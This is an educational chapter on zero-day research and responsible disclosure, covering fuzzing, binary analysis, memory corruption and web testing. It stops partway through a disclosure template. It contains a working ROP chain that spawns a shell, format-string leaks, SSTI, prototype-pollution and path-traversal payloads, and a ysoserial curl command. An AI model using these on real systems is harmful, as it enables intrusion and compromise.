# Part 87: Zero-Day Research (Steps 861-870)

## ภาพรวม
การวิจัยหาช่องโหว่แบบ Zero-Day สำหรับการศึกษาในบริบทแอง Responsible Disclosure และ Bug Bounty

---

## Step 861: Zero-Day Research Fundamentals

หลักการและกระบวนการวิจัย Zero-Day

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum
from datetime import datetime

class VulnType(Enum):
    MEMORY_CORRUPTION = "Memory Corruption"
    USE_AFTER_FREE = "Use After Free"
    HEAP_OVERFLOW = "Heap Overflow"
    STACK_OVERFLOW = "Stack Overflow"
    INTEGER_OVERFLOW = "Integer Overflow"
    FORMAT_STRING = "Format String"
    RACE_CONDITION = "Race Condition"
    TYPE_CONFUSION = "Type Confusion"
    LOGIC_BUG = "Logic Bug"
    INJECTION = "Injection"

@dataclass
class ZeroDayResearch:
    target_software: str
    version: str
    platform: str
    researcher: str
    discovery_date: datetime = field(default_factory=datetime.now)
    vuln_type: Optional[VulnType] = None
    cve_id: Optional[str] = None
    cvss_score: float = 0.0
    poc_available: bool = False
    disclosed: bool = False
    
    # Vulnerability research lifecycle
    RESEARCH_PHASES = [
        "1. Target Selection - Choose software to research",
        "2. Attack Surface Analysis - Map inputs/interfaces",
        "3. Reconnaissance - Understand architecture/code",
        "4. Fuzzing - Automated input generation",
        "5. Manual Analysis - Code review/reverse engineering",
        "6. Trigger Development - Reproduce consistently",
        "7. Root Cause Analysis - Understand the bug",
        "8. Exploitability Assessment - Impact analysis",
        "9. PoC Development - Write proof of concept",
        "10. Responsible Disclosure - Report to vendor"
    ]
    
    # Bug bounty programs
    BUG_BOUNTY_PROGRAMS = {
        "HackerOne": "https://hackerone.com/programs",
        "Bugcrowd": "https://bugcrowd.com/programs",
        "Synack": "https://synack.com (invite only)",
        "Intigriti": "https://intigriti.com",
        "YesWeHack": "https://yeswehack.com",
        "Google VRP": "https://bughunters.google.com",
        "Microsoft MSRC": "https://msrc.microsoft.com/report",
        "Apple Security": "https://security.apple.com/bounty"
    }
    
    # CVE disclosure timeline
    DISCLOSURE_TIMELINE = {
        "Day 0": "Discovery - Researcher finds vulnerability",
        "Day 1-7": "Verify - Confirm reproducibility and impact",
        "Day 7-14": "Report - Submit to vendor via security contact",
        "Day 14-21": "Acknowledge - Vendor confirms receipt",
        "Day 21-90": "Remediation - Vendor develops and tests patch",
        "Day 90": "Google Project Zero deadline",
        "Patch Day": "Coordinated public disclosure with CVE"
    }

if __name__ == '__main__':
    research = ZeroDayResearch(
        target_software="Hypothetical App",
        version="1.0.0",
        platform="Linux x64",
        researcher="Security Researcher"
    )
    print("Research Phases:")
    for phase in research.RESEARCH_PHASES:
        print(f"  {phase}")
    print("\nBug Bounty Programs:")
    for prog, url in research.BUG_BOUNTY_PROGRAMS.items():
        print(f"  {prog}: {url}")
```

---

## Step 862: Attack Surface Analysis

การวิเคราะห์ Attack Surface ของซอฟต์แวร์

```python
from typing import Dict, List
from dataclasses import dataclass

@dataclass
class AttackVector:
    name: str
    vector_type: str  # network, local, physical, adjacent
    complexity: str   # low, medium, high
    authentication: str  # none, single, multiple
    description: str
    examples: List[str]

class AttackSurfaceAnalysis:
    """วิเคราะห์ attack surface สำหรับ target software"""
    
    def analyze_web_application(self) -> Dict[str, List[str]]:
        """Web application attack vectors"""
        return {
            "input_vectors": [
                "GET/POST parameters", "HTTP headers",
                "Cookies", "JSON/XML body",
                "File uploads", "WebSockets",
                "GraphQL queries", "gRPC endpoints"
            ],
            "authentication_surfaces": [
                "Login forms", "OAuth/OIDC flows",
                "API keys", "Session tokens",
                "SSO/SAML", "MFA bypass"
            ],
            "file_system_access": [
                "File uploads", "Path traversal",
                "Log files", "Config files"
            ],
            "third_party_integrations": [
                "Payment processors", "Email services",
                "Cloud storage", "External APIs"
            ]
        }
    
    def analyze_binary_application(self) -> Dict[str, List[str]]:
        """Binary application attack vectors"""
        return {
            "network_inputs": [
                "TCP/UDP packet data",
                "Protocol parsers",
                "SSL/TLS handling"
            ],
            "file_parsing": [
                "Document parsers (PDF, Office)",
                "Image/media formats",
                "Configuration files"
            ],
            "environment_inputs": [
                "Environment variables",
                "Command-line arguments",
                "Shared memory/IPC"
            ],
            "ipc_mechanisms": [
                "D-Bus (Linux)",
                "COM/RPC (Windows)",
                "Unix sockets",
                "Named pipes"
            ]
        }
    
    def generate_attack_surface_map(self, app_name: str, vectors: Dict) -> str:
        """Generate attack surface documentation"""
        report = f"# Attack Surface Map: {app_name}\n\n"
        for category, items in vectors.items():
            report += f"## {category.replace('_', ' ').title()}\n"
            for item in items:
                report += f"- {item}\n"
            report += "\n"
        return report
    
    def priority_ranking(self, vectors: List[AttackVector]) -> List[AttackVector]:
        """Sort attack vectors by priority for research"""
        score_map = {
            'network': 3, 'adjacent': 2, 'local': 1, 'physical': 0,
            'low': 3, 'medium': 2, 'high': 1,
            'none': 3, 'single': 2, 'multiple': 1
        }
        
        def score(v: AttackVector) -> int:
            return (score_map.get(v.vector_type, 0) +
                    score_map.get(v.complexity, 0) +
                    score_map.get(v.authentication, 0))
        
        return sorted(vectors, key=score, reverse=True)

if __name__ == '__main__':
    analyzer = AttackSurfaceAnalysis()
    vectors = analyzer.analyze_web_application()
    print("Web Application Attack Surface:")
    for cat, items in vectors.items():
        print(f"\n{cat}: {len(items)} vectors")
        for item in items:
            print(f"  - {item}")
```

---

## Step 863: Fuzzing Techniques

เทคนิค Fuzzing เพื่อค้นหาช่องโหว่อัตโนมัติ

```python
import random
import struct
import os
from typing import List, Callable, Optional
from dataclasses import dataclass

@dataclass
class FuzzResult:
    input_data: bytes
    crashed: bool
    crash_type: Optional[str]
    signal: Optional[int]
    output: str

class FuzzingTechniques:
    """เทคนิค fuzzing สำหรับ zero-day research"""
    
    # Interesting integer values that often trigger bugs
    MAGIC_INTEGERS = [
        0, 1, -1, 127, 128, 255, 256, 0xFF, 0x100,
        0x7FFF, 0x8000, 0xFFFF, 0x10000,
        0x7FFFFFFF, 0x80000000, 0xFFFFFFFF,
        0x7FFFFFFFFFFFFFFF, 0x8000000000000000
    ]
    
    # Interesting string payloads
    MAGIC_STRINGS = [
        "",                     # Empty string
        "A" * 100,             # Short overflow
        "A" * 1000,            # Medium overflow
        "A" * 10000,           # Large overflow
        "%s%s%s%s",            # Format string
        "%x%x%x%x",            # Format string hex
        "../../../etc/passwd", # Path traversal
        "\x00" * 100,          # Null bytes
        "\xff" * 100,          # 0xFF bytes
        "\n\r\t" * 10,         # Control characters
    ]
    
    def bit_flip_mutation(self, data: bytes, flip_ratio: float = 0.001) -> bytes:
        """Bit-flip mutation for fuzzing"""
        data_array = bytearray(data)
        for i in range(len(data_array)):
            for bit in range(8):
                if random.random() < flip_ratio:
                    data_array[i] ^= (1 << bit)
        return bytes(data_array)
    
    def byte_substitution(self, data: bytes) -> bytes:
        """Substitute bytes with magic values"""
        data_array = bytearray(data)
        if data_array:
            pos = random.randint(0, len(data_array) - 1)
            magic_byte = random.choice([0x00, 0xFF, 0x7F, 0x80])
            data_array[pos] = magic_byte
        return bytes(data_array)
    
    def integer_boundary_mutation(self, value: int, size: int = 4) -> List[int]:
        """Generate boundary values around an integer"""
        boundaries = []
        max_val = (1 << (size * 8)) - 1
        mid_val = 1 << (size * 8 - 1)
        
        test_values = [
            0, 1, value - 1, value, value + 1,
            mid_val - 1, mid_val, mid_val + 1,
            max_val - 1, max_val
        ]
        return [v for v in test_values if 0 <= v <= max_val]
    
    def structure_aware_fuzzing(self, json_template: dict) -> List[dict]:
        """Generate mutations of a JSON structure"""
        import json
        mutations = []
        
        # Type confusion mutations
        for key in json_template:
            mutation = dict(json_template)
            original = mutation[key]
            
            # Swap types
            if isinstance(original, str):
                mutation[key] = 0  # String -> Int
            elif isinstance(original, int):
                mutation[key] = "A" * 1000  # Int -> Long string
            elif isinstance(original, list):
                mutation[key] = None  # Array -> Null
            elif isinstance(original, dict):
                mutation[key] = []  # Object -> Array
            
            mutations.append(mutation)
        
        # Boundary value mutations
        for key in json_template:
            if isinstance(json_template[key], int):
                for val in self.integer_boundary_mutation(json_template[key]):
                    mutation = dict(json_template)
                    mutation[key] = val
                    mutations.append(mutation)
        
        return mutations
    
    def libfuzzer_harness_template(self, target_function: str) -> str:
        """C LibFuzzer harness template"""
        return f"""
// LibFuzzer harness for {target_function}
#include <stdint.h>
#include <stddef.h>
#include <string.h>

// Include target library headers
// #include "target.h"

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {{
    // Minimum input size check
    if (size < 4) return 0;
    
    // Create a copy of input to avoid aliasing issues
    char *input = (char *)malloc(size + 1);
    if (!input) return 0;
    memcpy(input, data, size);
    input[size] = '\\0';
    
    // Call target function
    // {target_function}(input, size);
    
    free(input);
    return 0;
}}

// Compile with:
// clang++ -g -fsanitize=address,fuzzer harness.cpp -o fuzzer
// ./fuzzer -max_len=1024 -jobs=4 corpus/
"""
    
    def afl_setup_guide(self) -> str:
        """AFL++ setup and usage guide"""
        return """
# AFL++ Fuzzing Setup

## Installation
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus && make distrib && sudo make install

## Instrument target
CC=afl-cc CXX=afl-c++ ./configure --prefix=/tmp/fuzz-install
make -j4 && make install

## Create corpus directory
mkdir -p corpus/
echo 'valid_input' > corpus/seed.txt

## Start fuzzing
afl-fuzz -i corpus/ -o findings/ -- /tmp/fuzz-install/bin/target @@

## With multiple cores
afl-fuzz -i corpus/ -o findings/ -M fuzzer0 -- target @@
afl-fuzz -i corpus/ -o findings/ -S fuzzer1 -- target @@

## Analyze crashes
afl-tmin -i findings/crashes/id:000 -o minimized_crash -- target @@
afl-analyze -i minimized_crash -- target @@
        """

if __name__ == '__main__':
    fuzzer = FuzzingTechniques()
    
    # Demonstrate bit flip mutation
    original = b"Hello World"
    mutated = fuzzer.bit_flip_mutation(original, flip_ratio=0.1)
    print(f"Original: {original}")
    print(f"Mutated:  {mutated}")
    
    # Integer boundary values
    boundaries = fuzzer.integer_boundary_mutation(100, size=1)
    print(f"\nBoundary values for 100 (1 byte): {boundaries}")
    
    # JSON mutations
    template = {"user_id": 42, "name": "test", "admin": False}
    mutations = fuzzer.structure_aware_fuzzing(template)
    print(f"\nGenerated {len(mutations)} JSON mutations")
    
    print("\nLibFuzzer harness template:")
    print(fuzzer.libfuzzer_harness_template("parse_input")[:300])
```

---

## Step 864: Binary Analysis with Ghidra/IDA

การวิเคราะห์ไฟล์ binary เพื่อค้นหา vulnerabilities

```python
from typing import List, Dict

class BinaryAnalysis:
    """เครื่องมือและเทคนิคสำหรับ binary analysis"""
    
    # Ghidra scripting (Jython/Java)
    GHIDRA_SCRIPTS = {
        "find_dangerous_functions": """
# Ghidra script: Find dangerous function calls
from ghidra.program.model.symbol import RefType
from ghidra.app.script import GhidraScript

DANGEROUS = ['strcpy', 'strcat', 'sprintf', 'gets', 'scanf', 'system']

def run():
    fm = currentProgram.getFunctionManager()
    for func in fm.getFunctions(True):
        for ref in func.getCalledFunctions(monitor):
            if ref.getName() in DANGEROUS:
                print(f'[DANGEROUS] {func.getName()} calls {ref.getName()}')
""",
        "find_format_strings": """
# Find potential format string vulnerabilities
from ghidra.program.model.listing import CodeUnitIterator

def run():
    listing = currentProgram.getListing()
    refs = currentProgram.getReferenceManager()
    
    printf_sym = getSymbol('printf', None)
    if printf_sym:
        for ref in refs.getReferencesTo(printf_sym.getAddress()):
            call_site = ref.getFromAddress()
            # Check if format string is a variable (not a string literal)
            print(f'printf call at: {call_site}')
"""
    }
    
    # radare2 commands for analysis
    RADARE2_WORKFLOW = [
        "r2 -A target_binary     # Open with full analysis",
        "afl                     # List all functions",
        "axt @ sym.strcpy        # Find xrefs TO strcpy",
        "pdf @ sym.vulnerable_func  # Disassemble function",
        "s main; pdf             # Disassemble main",
        "iz                      # List strings",
        "ii                      # List imports",
        "/c call sym.strcpy     # Search for calls to strcpy",
        "pxw 64 @ rbp-0x20       # Examine stack",
        "dr                      # Show registers",
        "dc                      # Continue execution"
    ]
    
    # GDB/PEDA commands for dynamic analysis
    GDB_COMMANDS = [
        "gdb ./target",
        "checksec                     # Check security mitigations",
        "info functions               # List all functions",
        "break *0x400550              # Set breakpoint at address",
        "break vulnerable_function    # Set breakpoint at function",
        "run AAAA                     # Run with input",
        "x/20wx $rsp                  # Examine stack (20 words)",
        "x/10i $rip                   # Examine 10 instructions",
        "info registers               # Show all registers",
        "pattern create 200           # Create cyclic pattern (PEDA)",
        "pattern offset $rip          # Find offset to RIP"
    ]
    
    def identify_security_mitigations(self, binary_path: str) -> Dict[str, bool]:
        """ตรวจสอบ security mitigations ของ binary"""
        print(f"Checking mitigations: checksec --file={binary_path}")
        
        # Simulated checksec output
        return {
            "RELRO": "Full RELRO",      # GOT protection
            "Stack": "Canary found",    # Stack overflow protection
            "NX": "NX enabled",         # Non-executable stack
            "PIE": "PIE enabled",        # Position Independent Executable
            "FORTIFY": "Enabled",        # Fortify source
            "ASAN": False,              # AddressSanitizer
        }
    
    def analyze_attack_complexity(self, mitigations: Dict) -> str:
        """ประเมินความยากในการโจมตี"""
        bypass_needed = []
        
        if "Canary" in mitigations.get("Stack", ""):
            bypass_needed.append("Stack canary bypass (info leak or brute force)")
        if "NX enabled" in mitigations.get("NX", ""):
            bypass_needed.append("NX bypass (ROP chain required)")
        if "PIE enabled" in mitigations.get("PIE", ""):
            bypass_needed.append("ASLR bypass (info leak required)")
        if "Full RELRO" in mitigations.get("RELRO", ""):
            bypass_needed.append("GOT overwrite not possible")
        
        if not bypass_needed:
            return "LOW complexity - few mitigations"
        elif len(bypass_needed) <= 2:
            return f"MEDIUM complexity - need to bypass: {bypass_needed}"
        else:
            return f"HIGH complexity - need to bypass: {bypass_needed}"

if __name__ == '__main__':
    analyzer = BinaryAnalysis()
    
    # Check mitigations
    mitigations = analyzer.identify_security_mitigations("/tmp/target")
    print("Security Mitigations:")
    for control, status in mitigations.items():
        print(f"  {control}: {status}")
    
    complexity = analyzer.analyze_attack_complexity(mitigations)
    print(f"\nExploit Complexity: {complexity}")
    
    print("\nradare2 Workflow:")
    for cmd in analyzer.RADARE2_WORKFLOW[:5]:
        print(f"  {cmd}")
```

---

## Step 865: Memory Corruption Fundamentals

ความรู้พื้นฐานเกี่ยวกับ Memory Corruption

```python
import ctypes
from typing import List, Dict

class MemoryCorruptionConcepts:
    """อธิบาย memory corruption bug classes"""
    
    # Stack buffer overflow example (conceptual)
    STACK_OVERFLOW_EXAMPLE = """
// Vulnerable C code (stack buffer overflow)
#include <string.h>
void vulnerable(char *input) {
    char buffer[64];        // Fixed-size buffer on stack
    strcpy(buffer, input);  // No bounds checking!
    // Stack layout: [buffer (64 bytes)][saved RBP (8)][return addr (8)]
    // Overflow overwrites return address
}

// Stack frame visualization:
// High address
// +------------------+
// | Return Address   | <-- Target: overwrite with shellcode/ROP
// +------------------+
// | Saved RBP        |
// +------------------+  <-- buffer + 64
// | buffer[63]       |
// |       ...        |
// | buffer[0]        | <-- buffer (starts here)
// +------------------+
// Low address
"""
    
    # Heap overflow example
    HEAP_OVERFLOW_EXAMPLE = """
// Vulnerable C code (heap overflow)
#include <stdlib.h>
#include <string.h>

struct Chunk {
    int size;
    char data[16];  // Small buffer
    void (*callback)(void);  // Function pointer
};

void vulnerable(char *input, int len) {
    struct Chunk *c = malloc(sizeof(struct Chunk));
    c->callback = legit_function;  // Set initially
    memcpy(c->data, input, len);   // Overflow into callback!
    c->callback();                  // Call overwritten pointer
}
"""
    
    # Use-After-Free example
    USE_AFTER_FREE_EXAMPLE = """
// Use-After-Free in C++
class Widget {
public:
    virtual void render() { ... }
    int value;
};

void vulnerable() {
    Widget *w = new Widget();
    w->value = 42;
    
    delete w;  // Free the object
    
    // ... some code that can ALLOCATE same-size chunk ...
    // Attacker can control what goes into the freed memory
    
    w->render();  // UAF: calls virtual function through stale vtable ptr
    // If attacker allocated a fake object here, they control execution
}
"""
    
    # Integer overflow
    INTEGER_OVERFLOW_EXAMPLE = """
// Integer overflow leading to heap overflow
#include <stdlib.h>
void vulnerable(int count, int item_size) {
    // Integer overflow: if count=0x40000000, item_size=8
    // count * item_size = 0x200000000 = 0 (overflow!)
    int total = count * item_size;  // Wraps to 0
    char *buf = malloc(total);      // malloc(0) returns small chunk
    
    // But we copy 'count' items of 'item_size'...
    for (int i = 0; i < count; i++) {
        memcpy(buf + (i * item_size), items[i], item_size);  // Overflow!
    }
}

// Fix: use size_t and check for overflow
void fixed(size_t count, size_t item_size) {
    size_t total;
    if (__builtin_mul_overflow(count, item_size, &total)) {
        return;  // Overflow detected
    }
    char *buf = malloc(total);
    ...
}
"""
    
    def explain_heap_metadata(self) -> str:
        """Explain glibc heap chunk structure"""
        return """
# glibc Heap Chunk Structure

## Free chunk layout:
    prev_size (8 bytes) -- size of previous chunk if free
    size      (8 bytes) -- size with flags: P(prev in use), M(mmaped), A(non-main arena)
    fd        (8 bytes) -- forward pointer to next free chunk
    bk        (8 bytes) -- backward pointer to prev free chunk
    [data...]
    size      (8 bytes) -- footer (for coalescing)

## Key concepts:
- Heap overflow: write beyond allocated chunk into adjacent
- Overwrite fd/bk pointers for arbitrary write primitives
- Fastbins: singly-linked list for small chunks (< 128 bytes)
- tcache: per-thread cache (glibc 2.26+), easier to exploit
- House of series: named heap exploitation techniques
        """
    
    def exploitation_techniques(self) -> Dict[str, str]:
        return {
            "ret2shellcode": "Jump to shellcode in buffer (NX disabled)",
            "ret2libc": "Return to system() in libc (bypasses NX)",
            "ROP": "Return-Oriented Programming - chain gadgets",
            "heap_spray": "Fill heap with shellcode to hit predictable addresses",
            "tcache_poisoning": "Corrupt tcache fd pointer for arbitrary alloc",
            "fastbin_dup": "Double-free in fastbin for arbitrary alloc",
            "unsorted_bin_attack": "Corrupt unsorted bin for arbitrary write",
            "FSOP": "File Structure Oriented Programming"
        }

if __name__ == '__main__':
    concepts = MemoryCorruptionConcepts()
    print("Stack Buffer Overflow Visualization:")
    print(concepts.STACK_OVERFLOW_EXAMPLE)
    print("\nExploitation Techniques:")
    for tech, desc in concepts.exploitation_techniques().items():
        print(f"  {tech}: {desc}")
```

---

## Step 866: Exploit Development Basics

พื้นฐานการพัฒนา exploit สำหรับการศึกษา

```python
from pwn import *  # pwntools library
import struct
from typing import List, Optional

class ExploitDevelopment:
    """เครื่องมือและเทคนิค exploit development"""
    
    def find_offset_with_pattern(self) -> str:
        """Find crash offset using cyclic pattern"""
        # Generate 200-byte cyclic pattern
        # pattern = cyclic(200)  # pwntools
        return """
# Find RIP/EIP offset with cyclic pattern (pwntools)
from pwn import cyclic, cyclic_find

pattern = cyclic(200)
print(f'Send this as input: {pattern}')

# After crash, read the value in RIP/EIP:
# e.g., RIP = 0x6161616261616161
rip_value = b'aaab'  # first 4 bytes of what's in RIP
offset = cyclic_find(rip_value)
print(f'Offset to RIP: {offset}')
        """
    
    def basic_rop_chain(self, binary_path: str) -> str:
        """Build a basic ROP chain using pwntools"""
        return f"""
# Basic ROP chain to call system('/bin/sh')
from pwn import *

binary = ELF('{binary_path}')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(binary)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh_addr = next(libc.search(b'/bin/sh'))
system_addr = libc.sym['system']

# Build payload
offset = 72  # bytes to reach return address
payload = b'A' * offset
payload += p64(pop_rdi)        # pop rdi; ret
payload += p64(binsh_addr)     # "/bin/sh" address
payload += p64(system_addr)    # system()

# Send payload
proc = process('{binary_path}')
proc.sendline(payload)
proc.interactive()
        """
    
    def information_leak_techniques(self) -> Dict[str, str]:
        """Techniques to leak memory addresses"""
        return {
            "format_string_leak": """
# Format string to leak stack/GOT addresses
payload = b'%7$p'     # Print 7th stack argument as pointer
payload = b'%s'       # Dereference and print as string
payload = b'AAAA%x.%x.%x.%x'  # Leak stack values
            """,
            "got_leak": """
# Leak GOT entry to find libc base
# If we have arbitrary read:
got_entry = binary.got['puts']  # Address of puts in GOT
puts_addr = leak_memory(got_entry)  # Read 8 bytes
libc_base = puts_addr - libc.sym['puts']
            """,
            "heap_leak": """
# Leak heap address through UAF/uninitialized memory
# Freed tcache chunk contains heap address in fd pointer
free(chunk)
leak = read_memory(chunk)  # fd pointer = heap address
heap_base = leak & ~0xFFF   # Page-align
            """
        }
    
    def pwntools_quickref(self) -> List[str]:
        """Quick reference for pwntools"""
        return [
            "p = process('./binary')          # Local process",
            "p = remote('host', 1337)         # Remote connection",
            "p.send(b'data')                  # Send bytes",
            "p.sendline(b'data\\n')            # Send with newline",
            "p.recv(100)                      # Receive 100 bytes",
            "p.recvuntil(b'> ')               # Receive until prompt",
            "p.interactive()                  # Interactive mode",
            "p64(0xdeadbeef)                  # Pack 64-bit little-endian",
            "p32(0xdeadbeef)                  # Pack 32-bit little-endian",
            "u64(p.recv(8))                   # Unpack 64-bit",
            "log.info('addr: %#x', addr)      # Log with hex",
            "cyclic(100)                      # Generate cyclic pattern",
            "cyclic_find(b'aaab')             # Find offset in pattern",
            "ELF('./binary')                  # Load ELF",
            "ROP(binary).gadgets              # Find ROP gadgets"
        ]

if __name__ == '__main__':
    dev = ExploitDevelopment()
    print("Finding crash offset:")
    print(dev.find_offset_with_pattern())
    
    print("\nInformation Leak Techniques:")
    for tech, code in dev.information_leak_techniques().items():
        print(f"  {tech}: {code[:80]}...")
    
    print("\npwntools Quick Reference:")
    for ref in dev.pwntools_quickref()[:8]:
        print(f"  {ref}")
```

---

## Step 867: Web Application Zero-Days

การค้นหาช่องโหว่ใน Web Application

```python
import requests
import json
from typing import List, Dict, Optional

class WebAppZeroDay:
    """เทคนิคค้นหาช่องโหว่ใน web application"""
    
    def prototype_pollution_test(self, base_url: str) -> List[str]:
        """Test for JavaScript prototype pollution"""
        payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            '{"__proto__": {"isAdmin": "true"}}',
            # Nested prototype pollution
            '{"a": {"__proto__": {"polluted": "yes"}}}',
        ]
        
        results = []
        for payload in payloads:
            try:
                # Test JSON body
                resp = requests.post(
                    f"{base_url}/api/update",
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('admin') or data.get('isAdmin'):
                        results.append(f"VULN: Prototype pollution with {payload[:50]}")
            except Exception as e:
                pass
        return results
    
    def template_injection_test(self, url: str, param: str) -> List[Dict]:
        """Test for Server-Side Template Injection (SSTI)"""
        # Detection payloads (math expressions that evaluate)
        ssti_probes = [
            ("{{7*7}}", "49"),            # Jinja2/Twig
            ("${7*7}", "49"),              # FreeMarker/Velocity
            ("<%= 7*7 %>", "49"),          # ERB (Ruby)
            ("{{7*'7'}}", "7777777"),      # Jinja2 specific
            ("#set($x=7*7)${x}", "49"),   # Velocity
        ]
        
        results = []
        for payload, expected in ssti_probes:
            try:
                resp = requests.get(url, params={param: payload}, timeout=5)
                if expected in resp.text:
                    results.append({
                        "vuln": "SSTI",
                        "payload": payload,
                        "template_engine": self._identify_engine(payload)
                    })
            except Exception:
                pass
        return results
    
    def _identify_engine(self, payload: str) -> str:
        if '{{' in payload:
            return "Jinja2 / Twig / Tornado"
        elif '${' in payload:
            return "FreeMarker / Velocity / Java"
        elif '<%=' in payload:
            return "ERB (Ruby) / ASP"
        return "Unknown"
    
    def deserialization_test(self) -> Dict[str, str]:
        """Java deserialization test payloads"""
        return {
            "ysoserial": (
                "java -jar ysoserial.jar CommonsCollections6 'id' | "
                "base64 | curl -X POST -d @- http://target/api/deserialize"
            ),
            "detect_java_serial": (
                "Look for: rO0AB (base64) or AC ED 00 05 (hex) - Java serialization magic bytes"
            ),
            "detect_python_pickle": (
                "Look for: base64 with \\x80\\x04 prefix - Python pickle protocol 4"
            ),
            "php_object_injection": (
                # PHP unserialize with magic methods
                "payload: O:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}"
            )
        }
    
    def race_condition_test(self, endpoint: str) -> str:
        """Test for race conditions (e.g., double-spend)"""
        return """
import threading
import requests

def send_request():
    return requests.post(
        endpoint,
        data={'action': 'redeem_coupon', 'code': 'SAVE50'},
        cookies={'session': 'valid_session'}
    )

# Send multiple simultaneous requests
threads = [threading.Thread(target=send_request) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]

# Check if coupon was applied multiple times (race condition vulnerability)
        """
    
    def oauth_vulnerabilities(self) -> List[str]:
        """Common OAuth/OIDC vulnerabilities"""
        return [
            "Open redirect in redirect_uri parameter",
            "CSRF - missing state parameter validation",
            "Authorization code interception",
            "Token leakage via Referer header",
            "Mix-up attacks (multiple IdP scenarios)",
            "nonce replay - missing nonce validation",
            "id_token algorithm confusion (alg: none)"
        ]

if __name__ == '__main__':
    tester = WebAppZeroDay()
    print("SSTI Detection Payloads:")
    probes = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49")
    ]
    for payload, expected in probes:
        print(f"  Payload: {payload} -> Expected: {expected}")
    
    print("\nDeserialization Tests:")
    deser = tester.deserialization_test()
    for k, v in deser.items():
        print(f"  {k}: {v[:80]}")
    
    print("\nOAuth Vulnerabilities:")
    for vuln in tester.oauth_vulnerabilities():
        print(f"  - {vuln}")
```

---

## Step 868: Root Cause Analysis

การวิเคราะห์หาสาเหตุหลักของช่องโหว่

```python
from typing import Dict, List
from dataclasses import dataclass

@dataclass
class RootCauseAnalysis:
    """Root cause analysis for vulnerabilities"""
    
    crash_type: str
    crash_address: int
    input_that_triggered: bytes
    stack_trace: List[str]
    registers: Dict[str, int]
    
    def classify_crash(self) -> Dict[str, str]:
        """Classify crash type based on signals and context"""
        classifications = {}
        
        # Signal-based classification
        signal_map = {
            "SIGSEGV": "Segmentation fault - invalid memory access",
            "SIGABRT": "Abort - often heap corruption (glibc checks)",
            "SIGFPE": "Floating point exception - often division by zero",
            "SIGILL": "Illegal instruction - code execution or corruption",
            "SIGBUS": "Bus error - misaligned memory access",
            "SIGTRAP": "Trap - breakpoint or stack canary triggered"
        }
        classifications["signal"] = signal_map.get(self.crash_type, "Unknown")
        
        # Address-based classification
        if self.crash_address == 0:
            classifications["type"] = "NULL pointer dereference"
        elif self.crash_address < 0x1000:
            classifications["type"] = "Near-NULL dereference (small offset from NULL)"
        elif self.crash_address > 0x7fffffffffff:  # Kernel space on Linux
            classifications["type"] = "Kernel address dereference (possible privilege escalation)"
        else:
            classifications["type"] = "Heap/stack corruption or UAF"
        
        # RIP/EIP analysis
        rip = self.registers.get('rip', 0)
        if self.crash_address == rip:
            classifications["impact"] = "CRITICAL: Control flow hijack (PC control)"
        elif rip == 0x4141414141414141:  # 'AAAA' pattern
            classifications["impact"] = "CRITICAL: RIP overwritten with pattern (full control)"
        else:
            classifications["impact"] = "Crash - exploitability TBD"
        
        return classifications
    
    def write_vulnerability_report(self) -> str:
        """Generate structured vulnerability report"""
        classifications = self.classify_crash()
        return f"""
## Vulnerability Report

### Crash Summary
- Type: {self.crash_type}
- Crash Address: {hex(self.crash_address)}
- Classification: {classifications.get('type', 'Unknown')}
- Impact: {classifications.get('impact', 'Unknown')}

### Root Cause
[Describe the root cause here based on code analysis]

### Trigger Input
```
{self.input_that_triggered.hex()}
```

### Stack Trace
{chr(10).join(self.stack_trace)}

### Registers
{chr(10).join(f'{r}: {hex(v)}' for r, v in self.registers.items())}

### Exploitability
- [ ] Reproducible: Yes
- [ ] Input controlled: TBD
- [ ] Memory layout predictable: TBD
- [ ] Mitigations present: TBD
        """

if __name__ == '__main__':
    rca = RootCauseAnalysis(
        crash_type="SIGSEGV",
        crash_address=0x4141414141414141,
        input_that_triggered=b"A" * 200,
        stack_trace=["#0  0x4141414141414141 in ?? ()", "#1  0x00007ffff7a3d021 in main ()"],
        registers={"rip": 0x4141414141414141, "rsp": 0x7fffffffe230, "rbp": 0x4141414141414141}
    )
    classifications = rca.classify_crash()
    print("Crash Classifications:")
    for k, v in classifications.items():
        print(f"  {k}: {v}")
    print(rca.write_vulnerability_report()[:500])
```

---

## Step 869: Responsible Disclosure Process

กระบวนการแจ้งช่องโหว่อย่างรับผิดชอบ

```python
from dataclasses import dataclass, field
from typing import List, Optional
from datetime import datetime, timedelta
from enum import Enum

class DisclosureStatus(Enum):
    FOUND = "Found"
    PREPARING_REPORT = "Preparing Report"
    REPORTED = "Reported to Vendor"
    ACKNOWLEDGED = "Acknowledged by Vendor"
    IN_PROGRESS = "Fix In Progress"
    PATCH_RELEASED = "Patch Released"
    CVE_ASSIGNED = "CVE Assigned"
    DISCLOSED = "Publicly Disclosed"

@dataclass
class VulnerabilityDisclosure:
    researcher: str
    target_vendor: str
    software: str
    version: str
    discovery_date: datetime = field(default_factory=datetime.now)
    status: DisclosureStatus = DisclosureStatus.FOUND
    cve_id: Optional[str] = None
    disclosure_deadline: Optional[datetime] = None
    timeline: List[dict] = field(default_factory=list)
    
    def set_disclosure_deadline(self, days: int = 90):
        """Set 90-day disclosure deadline (Google Project Zero standard)"""
        self.disclosure_deadline = self.discovery_date + timedelta(days=days)
    
    def add_timeline_event(self, event: str, date: datetime = None):
        self.timeline.append({
            "date": (date or datetime.now()).isoformat(),
            "event": event
        })
    
    def generate_initial_report(self) -> str:
        """Generate initial vendor disclosure report"""
        return f"""
To: security@{self.target_vendor.lower().replace(' ', '')}.com
Subject: [Security Vulnerability] {self.software} - {self.version}

Dear {self.target_vendor} Security Team,

I am writing to report a security vulnerability I discovered in
{self.software} version {self.version}.

I follow responsible disclosure practices and am reporting this
privately before any public disclosure.

## Summary
[Brief description of the vulnerability]

## Severity
[Critical/High/Medium/Low with CVSS score]

## Technical Details
[Detailed technical description]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
